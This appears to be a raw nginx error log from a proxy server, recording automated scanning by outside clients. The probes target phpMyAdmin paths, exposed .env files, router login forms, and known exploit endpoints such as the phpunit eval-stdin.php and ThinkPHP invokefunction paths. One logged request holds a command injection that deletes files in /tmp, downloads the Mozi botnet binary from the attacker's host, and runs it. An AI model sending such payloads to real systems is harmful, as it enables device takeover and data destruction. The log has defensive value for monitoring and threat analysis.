2022/06/01 21:33:37 [error] 7895#7895: *31836 open() "/var/www/html/1phpmyadmin/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /1phpmyadmin/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:37 [error] 7895#7895: *31836 open() "/var/www/html/sql/phpMyAdmin2/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /sql/phpMyAdmin2/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:37 [error] 7895#7895: *31836 open() "/var/www/html/admin/phpmyadmin/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /admin/phpmyadmin/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:38 [error] 7895#7895: *31836 open() "/var/www/html/mysql/web/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /mysql/web/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:38 [error] 7895#7895: *31836 open() "/var/www/html/phpMyAdmin-5.1.2/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /phpMyAdmin-5.1.2/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:38 [error] 7895#7895: *31836 open() "/var/www/html/phpmyadmin2018/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /phpmyadmin2018/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:39 [error] 7895#7895: *31836 open() "/var/www/html/wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:39 [error] 7895#7895: *31836 open() "/var/www/html/phpmyadmin2019/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /phpmyadmin2019/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:39 [error] 7895#7895: *31836 open() "/var/www/html/mysql-admin/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /mysql-admin/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:39 [error] 7895#7895: *31836 open() "/var/www/html/phpmyadmin/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /phpmyadmin/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:40 [error] 7895#7895: *31836 open() "/var/www/html/db/phpMyAdmin/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /db/phpMyAdmin/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:40 [error] 7895#7895: *31836 open() "/var/www/html/MyAdmin/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /MyAdmin/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:40 [error] 7895#7895: *31836 open() "/var/www/html/mysql/pma/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /mysql/pma/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:41 [error] 7895#7895: *31836 open() "/var/www/html/phpmyadmin2015/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /phpmyadmin2015/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:41 [error] 7895#7895: *31836 open() "/var/www/html/sql/sqlweb/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /sql/sqlweb/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:41 [error] 7895#7895: *31836 open() "/var/www/html/database/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /database/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:41 [error] 7895#7895: *31836 open() "/var/www/html/sql/php-myadmin/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /sql/php-myadmin/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:42 [error] 7895#7895: *31836 open() "/var/www/html/phpmyadmin4/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /phpmyadmin4/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:42 [error] 7895#7895: *31836 open() "/var/www/html/2phpmyadmin/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /2phpmyadmin/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:42 [error] 7895#7895: *31836 open() "/var/www/html/phpmyAdmin/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /phpmyAdmin/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:43 [error] 7895#7895: *31836 open() "/var/www/html/program/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /program/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:43 [error] 7895#7895: *31836 open() "/var/www/html/sql/sqladmin/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /sql/sqladmin/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:43 [error] 7895#7895: *31836 open() "/var/www/html/phpMyAdmin-5.1.0/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /phpMyAdmin-5.1.0/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:44 [error] 7895#7895: *31836 open() "/var/www/html/administrator/web/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /administrator/web/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:44 [error] 7895#7895: *31836 open() "/var/www/html/phpmyadmin1/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /phpmyadmin1/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:44 [error] 7895#7895: *31836 open() "/var/www/html/sql/phpmyadmin5/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /sql/phpmyadmin5/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:44 [error] 7895#7895: *31836 open() "/var/www/html/phpMyAdmin-5/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /phpMyAdmin-5/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:45 [error] 7895#7895: *31836 open() "/var/www/html/admin/sqladmin/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /admin/sqladmin/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:45 [error] 7895#7895: *31836 open() "/var/www/html/admin/phpMyAdmin/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /admin/phpMyAdmin/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:45 [error] 7895#7895: *31836 open() "/var/www/html/phpmyadmin2021/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /phpmyadmin2021/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:46 [error] 7895#7895: *31836 open() "/var/www/html/phpMyAdmin-3/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /phpMyAdmin-3/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:46 [error] 7895#7895: *31836 open() "/var/www/html/sql/phpmyadmin4/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /sql/phpmyadmin4/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:46 [error] 7895#7895: *31836 open() "/var/www/html/db/db-admin/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /db/db-admin/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:47 [error] 7895#7895: *31836 open() "/var/www/html/mysql/db/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /mysql/db/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:47 [error] 7895#7895: *31836 open() "/var/www/html/phpmyadmin2022/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /phpmyadmin2022/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:47 [error] 7895#7895: *31836 open() "/var/www/html/phpMyAdmin4/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /phpMyAdmin4/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:47 [error] 7895#7895: *31836 open() "/var/www/html/phpmyadmin_/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /phpmyadmin_/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:48 [error] 7895#7895: *31836 open() "/var/www/html/sql/phpmy-admin/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /sql/phpmy-admin/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:48 [error] 7895#7895: *31836 open() "/var/www/html/phpmyadmin2016/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /phpmyadmin2016/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:48 [error] 7895#7895: *31836 open() "/var/www/html/phpMyAdmin-5.1.3/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /phpMyAdmin-5.1.3/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:49 [error] 7895#7895: *31836 open() "/var/www/html/sql/phpMyAdmin/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /sql/phpMyAdmin/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:49 [error] 7895#7895: *31836 open() "/var/www/html/sql/websql/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /sql/websql/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:49 [error] 7895#7895: *31836 open() "/var/www/html/_phpMyAdmin/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /_phpMyAdmin/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:50 [error] 7895#7895: *31850 open() "/var/www/html/administrator/phpMyAdmin/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /administrator/phpMyAdmin/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:50 [error] 7895#7895: *31850 open() "/var/www/html/PMA/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /PMA/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:50 [error] 7895#7895: *31850 open() "/var/www/html/phpmy/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /phpmy/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:51 [error] 7895#7895: *31850 open() "/var/www/html/phpMyAdmin5.1/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /phpMyAdmin5.1/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:51 [error] 7895#7895: *31850 open() "/var/www/html/sql/webdb/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /sql/webdb/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:51 [error] 7895#7895: *31850 open() "/var/www/html/_phpmyadmin_/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /_phpmyadmin_/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:52 [error] 7895#7895: *31850 open() "/var/www/html/sql/myadmin/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /sql/myadmin/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:52 [error] 7895#7895: *31850 open() "/var/www/html/mysql/admin/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /mysql/admin/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:52 [error] 7895#7895: *31850 open() "/var/www/html/db/phpmyadmin/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /db/phpmyadmin/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:52 [error] 7895#7895: *31850 open() "/var/www/html/phpmyadmin5/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /phpmyadmin5/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:53 [error] 7895#7895: *31850 open() "/var/www/html/db/myadmin/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /db/myadmin/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:53 [error] 7895#7895: *31850 open() "/var/www/html/mysqladmin/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /mysqladmin/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:53 [error] 7895#7895: *31850 open() "/var/www/html/phpmyadmin2020/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /phpmyadmin2020/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:54 [error] 7895#7895: *31850 open() "/var/www/html/phpmyadmin2013/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /phpmyadmin2013/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:54 [error] 7895#7895: *31850 open() "/var/www/html/db/webdb/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /db/webdb/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:54 [error] 7895#7895: *31850 open() "/var/www/html/phpMyAdmin5.2/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /phpMyAdmin5.2/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:55 [error] 7895#7895: *31850 open() "/var/www/html/admin/pma/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /admin/pma/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:55 [error] 7895#7895: *31850 open() "/var/www/html/shopdb/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /shopdb/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 21:33:55 [error] 7895#7895: *31850 open() "/var/www/html/sqlmanager/index.php" failed (2: No such file or directory), client: 114.32.178.222, server: localhost-nginx-proxy-manager, request: "GET /sqlmanager/index.php?lang=en HTTP/1.1", host: "186.104.67.127"
2022/06/01 22:22:05 [error] 7895#7895: *31860 open() "/var/www/html/shell" failed (2: No such file or directory), client: 103.181.56.105, server: localhost-nginx-proxy-manager, request: "GET /shell?cd+/tmp;rm+-rf+*;wget+http://103.181.56.105:51371/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1", host: "186.104.67.127:80"
2022/06/02 01:08:11 [error] 8013#8013: *31881 open() "/var/www/html/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 193.106.191.48, server: localhost-nginx-proxy-manager, request: "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "186.104.67.127:80"
2022/06/02 01:26:03 [error] 8013#8013: *31883 open() "/var/www/html/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 193.106.191.48, server: localhost-nginx-proxy-manager, request: "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "186.104.67.127:80"
2022/06/02 01:59:00 [error] 8051#8051: *31885 open() "/var/www/html/solr/admin/info/system" failed (2: No such file or directory), client: 193.106.191.48, server: localhost-nginx-proxy-manager, request: "GET /solr/admin/info/system?wt=json HTTP/1.1", host: "186.104.67.127:80"
2022/06/02 02:25:14 [error] 8051#8051: *31886 open() "/var/www/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 185.196.220.81, server: localhost-nginx-proxy-manager, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "186.104.67.127:80", referrer: "http://186.104.67.127:80/admin/login.asp"
2022/06/02 02:41:13 [error] 8088#8088: *31887 open() "/var/www/html/index.php" failed (2: No such file or directory), client: 193.106.191.48, server: localhost-nginx-proxy-manager, request: "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1", host: "186.104.67.127:80"
2022/06/02 03:19:39 [error] 8088#8088: *31905 open() "/var/www/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 185.196.220.81, server: localhost-nginx-proxy-manager, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "186.104.67.127:80", referrer: "http://186.104.67.127:80/admin/login.asp"
2022/06/02 05:00:38 [error] 8168#8168: *31949 "/var/www/html/HNAP1/index.html" is not found (2: No such file or directory), client: 104.244.74.181, server: localhost-nginx-proxy-manager, request: "POST /HNAP1/ HTTP/1.1", host: "186.104.66.58:80"
2022/06/02 05:30:09 [error] 8207#8207: *31952 open() "/var/www/html/editBlackAndWhiteList" failed (2: No such file or directory), client: 14.46.69.65, server: localhost-nginx-proxy-manager, request: "POST /editBlackAndWhiteList HTTP/1.1", host: "186.104.66.58:9000"
2022/06/02 05:47:24 [error] 8207#8207: *31954 "/var/www/html/webdav/index.html" is not found (2: No such file or directory), client: 106.13.17.16, server: localhost-nginx-proxy-manager, request: "GET /webdav/ HTTP/1.1", host: "186.104.66.58:80"
2022/06/02 06:48:41 [error] 8246#8246: *31956 "/var/www/html/HNAP1/index.html" is not found (2: No such file or directory), client: 104.244.74.181, server: localhost-nginx-proxy-manager, request: "POST /HNAP1/ HTTP/1.1", host: "186.104.66.58:80"
2022/06/02 07:10:12 [error] 8246#8246: *31957 open() "/var/www/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 182.121.132.175, server: localhost-nginx-proxy-manager, request: "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0"
2022/06/02 10:24:06 [alert] 8358#8358: 1024 worker_connections are not enough
2022/06/02 10:24:06 [error] 8360#8360: *34015 recv() failed (104: Connection reset by peer) while reading response header from upstream, client: 127.0.0.1, server: localhost-nginx-proxy-manager, request: "GET /favicon.ico HTTP/1.1", upstream: "http://127.0.0.1:80/favicon.ico", host: "186.104.66.58"
2022/06/02 10:24:12 [error] 8358#8358: *34017 open() "/var/www/html/robots.txt" failed (2: No such file or directory), client: 101.68.211.3, server: localhost-nginx-proxy-manager, request: "GET /robots.txt HTTP/1.1", host: "186.104.66.58:80"
2022/06/02 10:40:39 [error] 8399#8399: *34025 open() "/var/www/html/.DS_Store" failed (2: No such file or directory), client: 161.35.188.242, server: localhost-nginx-proxy-manager, request: "GET /.DS_Store HTTP/1.1", host: "186.104.66.58"
2022/06/02 10:40:39 [error] 8399#8399: *34026 open() "/var/www/html/info.php" failed (2: No such file or directory), client: 161.35.188.242, server: localhost-nginx-proxy-manager, request: "GET /info.php HTTP/1.1", host: "186.104.66.58"
2022/06/02 10:40:39 [error] 8399#8399: *34027 open() "/var/www/html/.json" failed (2: No such file or directory), client: 161.35.188.242, server: localhost-nginx-proxy-manager, request: "GET /.json HTTP/1.1", host: "186.104.66.58"
2022/06/02 10:40:40 [alert] 8399#8399: 1024 worker_connections are not enough
2022/06/02 10:40:40 [error] 8401#8401: *36058 recv() failed (104: Connection reset by peer) while reading response header from upstream, client: 127.0.0.1, server: localhost-nginx-proxy-manager, request: "GET /favicon.ico HTTP/1.1", upstream: "http://127.0.0.1:80/favicon.ico", host: "186.104.66.58"
2022/06/02 12:03:59 [alert] 8440#8440: 1024 worker_connections are not enough
2022/06/02 12:03:59 [error] 8443#8443: *38092 recv() failed (104: Connection reset by peer) while reading response header from upstream, client: 127.0.0.1, server: localhost-nginx-proxy-manager, request: "GET /favicon.ico HTTP/1.1", upstream: "http://127.0.0.1:80/favicon.ico", host: "186.104.66.58"
2022/06/02 13:16:47 [error] 8475#8475: *38096 open() "/var/www/html/editBlackAndWhiteList" failed (2: No such file or directory), client: 118.34.180.142, server: localhost-nginx-proxy-manager, request: "POST /editBlackAndWhiteList HTTP/1.1", host: "186.104.66.58:8080"
2022/06/02 16:54:54 [error] 8635#8635: *38137 open() "/var/www/html/robots.txt" failed (2: No such file or directory), client: 20.247.96.144, server: localhost-nginx-proxy-manager, request: "HEAD /robots.txt HTTP/1.0"
2022/06/02 17:34:28 [error] 8674#8674: *38140 open() "/var/www/html/config/getuser" failed (2: No such file or directory), client: 185.196.220.81, server: localhost-nginx-proxy-manager, request: "GET /config/getuser?index=0 HTTP/1.1", host: "186.104.66.58:80"
2022/06/02 18:58:25 [error] 8709#8709: *38163 "/var/www/html/HNAP1/index.html" is not found (2: No such file or directory), client: 104.244.74.181, server: localhost-nginx-proxy-manager, request: "POST /HNAP1/ HTTP/1.1", host: "186.104.66.58:80"
2022/06/03 00:13:00 [error] 8892#8892: *38168 open() "/var/www/html/index.php" failed (2: No such file or directory), client: 193.106.191.48, server: localhost-nginx-proxy-manager, request: "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1", host: "186.104.66.58:80"
2022/06/03 00:49:28 [error] 8931#8931: *38174 open() "/var/www/html/.env" failed (2: No such file or directory), client: 109.237.103.9, server: localhost-nginx-proxy-manager, request: "GET /.env HTTP/1.1", host: "186.104.66.58"
2022/06/03 01:02:31 [error] 8931#8931: *38175 open() "/var/www/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 185.196.220.81, server: localhost-nginx-proxy-manager, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "186.104.66.58:80", referrer: "http://186.104.66.58:80/admin/login.asp"
2022/06/03 02:29:57 [error] 9003#9003: *38185 "/var/www/html/console/index.html" is not found (2: No such file or directory), client: 193.106.191.48, server: localhost-nginx-proxy-manager, request: "GET /console/ HTTP/1.1", host: "186.104.66.58:80"
2022/06/03 02:40:24 [error] 9003#9003: *38186 open() "/var/www/html/Autodiscover/Autodiscover.xml" failed (2: No such file or directory), client: 193.106.191.48, server: localhost-nginx-proxy-manager, request: "POST /Autodiscover/Autodiscover.xml HTTP/1.1", host: "186.104.66.58:80"
2022/06/03 03:24:51 [error] 9003#9003: *38188 open() "/var/www/html/_ignition/execute-solution" failed (2: No such file or directory), client: 193.106.191.48, server: localhost-nginx-proxy-manager, request: "GET /_ignition/execute-solution HTTP/1.1", host: "186.104.66.58:80"
2022/06/03 05:35:35 [error] 9122#9122: *38197 open() "/var/www/html/actuator/gateway/routes" failed (2: No such file or directory), client: 193.106.191.48, server: localhost-nginx-proxy-manager, request: "GET /actuator/gateway/routes HTTP/1.1", host: "186.104.66.58:80"
2022/06/03 06:18:06 [error] 9122#9122: *38198 open() "/var/www/html/.env" failed (2: No such file or directory), client: 109.237.103.123, server: localhost-nginx-proxy-manager, request: "GET /.env HTTP/1.1", host: "186.104.66.58"
2022/06/03 08:30:35 [error] 9234#9234: *38213 open() "/var/www/html/hudson" failed (2: No such file or directory), client: 192.241.213.25, server: localhost-nginx-proxy-manager, request: "GET /hudson HTTP/1.1", host: "186.104.66.58"
2022/06/03 10:21:30 [error] 9270#9270: *38231 open() "/var/www/html/actuator/health" failed (2: No such file or directory), client: 192.241.222.122, server: localhost-nginx-proxy-manager, request: "GET /actuator/health HTTP/1.1", host: "186.104.66.58"
2022/06/03 10:21:46 [error] 9270#9270: *38232 open() "/var/www/html/portal/redlion" failed (2: No such file or directory), client: 192.241.203.88, server: localhost-nginx-proxy-manager, request: "GET /portal/redlion HTTP/1.1", host: "186.104.66.58"
2022/06/03 11:43:07 [error] 9354#9354: *38234 open() "/var/www/html/editBlackAndWhiteList" failed (2: No such file or directory), client: 27.213.126.101, server: localhost-nginx-proxy-manager, request: "POST /editBlackAndWhiteList HTTP/1.1", host: "186.104.66.58:90"
2022/06/03 11:54:34 [error] 9354#9354: *38253 "/var/www/html/english/index.html" is not found (2: No such file or directory), client: 60.13.7.210, server: localhost-nginx-proxy-manager, request: "GET http://www.rfa.org/english/ HTTP/1.1", host: "www.rfa.org"
2022/06/03 12:16:36 [error] 9354#9354: *38260 open() "/var/www/html/editBlackAndWhiteList" failed (2: No such file or directory), client: 123.4.240.84, server: localhost-nginx-proxy-manager, request: "POST /editBlackAndWhiteList HTTP/1.1", host: "58.66.104.186:9000"
2022/06/03 12:33:14 [error] 9390#9390: *38262 open() "/var/www/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 103.161.17.72, server: localhost-nginx-proxy-manager, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "186.104.66.58:80", referrer: "http://186.104.66.58:80/admin/login.asp"
